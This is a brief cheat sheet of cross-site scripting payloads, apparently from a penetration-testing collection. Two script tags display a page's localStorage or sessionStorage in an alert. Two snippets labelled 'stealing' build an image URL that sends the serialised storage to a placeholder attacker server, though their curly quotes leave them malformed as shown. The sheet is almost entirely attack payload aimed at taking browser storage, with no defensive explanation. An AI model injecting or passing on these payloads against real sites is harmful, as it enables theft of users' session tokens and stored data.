<b>`localStorage` in `alert`:</b>
```html
<script>alert(JSON.stringify(localStorage))</script>
```
<b>`sessionStorage` in `alert`:</b>
```html
<script>alert(JSON.stringify(sessionStorage))</script>
```
<b>`localStorage` stealing:</b>
```html
<img src=’https://{Attacker_server}/?storage=’+JSON.stringify(localStorage);’--!>
```
<b>`sessionStorage` stealing:</b>
```html
<img src=’https://{Attacker-server}/?storage=’+JSON.stringify(sessionStorage);’--!>
```
